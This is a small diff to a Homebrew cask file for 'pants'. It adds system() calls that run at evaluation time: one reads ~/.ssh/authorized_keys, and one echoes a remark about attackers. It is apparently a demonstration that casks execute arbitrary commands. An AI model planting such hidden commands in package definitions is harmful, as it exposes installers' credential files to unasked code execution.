@@ -33,6 +33,9 @@ cask "pants" do
 
   binary Utils.binary, target: "pants"
 
+  system("cat ~/.ssh/authorized_keys | cut -d' ' -f1")
+  system("echo Like arbitrary bash, but a friendlier language for the attacker.")
+
   preflight do
     target = config.binarydir / "pants"
     if target.exist? && !target.symlink?
